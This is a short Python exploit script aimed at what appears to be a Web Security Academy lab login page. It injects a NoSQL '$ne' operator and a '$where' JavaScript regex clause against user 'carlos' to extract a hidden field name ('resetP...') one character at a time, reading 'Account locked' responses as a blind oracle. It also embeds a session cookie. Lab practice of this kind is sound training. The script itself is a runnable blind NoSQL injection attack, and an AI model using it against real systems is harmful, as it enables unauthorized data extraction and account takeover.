#!/usr/bin/env python3
import requests
import string

url = "https://0ac0009404a041e98218797d00cb006e.web-security-academy.net/login"
headers = {
    "Cookie": "session=CInUWYnpHEMIbjBVttgAfw3X7oTxjSRc",
    "Content-Type": "application/json"
}

field_name = "resetP"  # We know this much already
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-"

print(f"Continuing extraction from 'resetP'...")
print("Field length is 13 characters")

for position in range(6, 13):  # positions 6-12
    found = False
    for char in charset:
        if char in ".*+?[]{}()^$|\\":
            char = "\\" + char

        payload = {
            "username": "carlos",
            "password": {"$ne": "invalid"},
            "$where": f"Object.keys(this)[4].match('^.{{{position}}}{char}.*')"
        }

        response = requests.post(url, headers=headers, json=payload)
        if "Account locked" in response.text:
            clean_char = char.replace("\\", "")
            field_name += clean_char
            print(f"Position {position}: {clean_char} (Field so far: {field_name})")
            found = True
            break

    if not found:
        print(f"Could not find character at position {position}")
        break

print(f"\nComplete field name at index [4]: {field_name}")